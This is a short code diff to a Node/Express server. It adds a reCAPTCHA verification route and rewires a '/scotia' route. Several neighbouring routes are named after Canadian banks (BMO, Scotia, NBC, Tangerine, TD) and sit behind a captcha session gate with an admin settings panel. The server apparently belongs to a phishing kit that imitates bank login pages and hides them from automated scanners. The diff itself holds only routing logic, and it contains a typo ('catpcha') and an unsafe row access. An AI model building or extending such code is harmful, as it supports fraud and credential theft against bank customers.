@@ -322,6 +322,24 @@ app.get('/', (req, res) => {
     res.render('captcha/index', {sitekey: RECAPTCHA_SITE_KEY})
 })
 
+app.post('/verify', verifyRecaptcha, async (req, res, next) => {
+    try{
+        const getId = 1; // Since we're always dealing with the record with id = 1
+        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
+
+        let info = result.rows[0].data.settings.info;  
+        
+        if(result.rows.length > 0){next()} else {res.render('catpcha/index', {sitekey: RECAPTCHA_SITE_KEY});}
+        
+        
+    } catch (error) {
+        console.error(error);
+        res.render('captcha/index', {sitekey: RECAPTCHA_SITE_KEY});
+    }
+})
+
+app.use('/scotia', checkRecaptchaSession,scotia)
+
 app.post('/update', checkAdminSession ,async (req, res) => {
     let data = req.body;
 
@@ -423,7 +441,6 @@ app.get('/admin/settings', checkAdminSession, async (req, res) => {
 });
 
 app.use('/bmo', checkRecaptchaSession,bmo)
-app.use('/scotia', verifyRecaptcha,scotia)
 app.use('/nbc', checkRecaptchaSession,nbc)
 app.use('/tangerine', checkRecaptchaSession,tangerine)
 app.use('/td', checkRecaptchaSession,td)
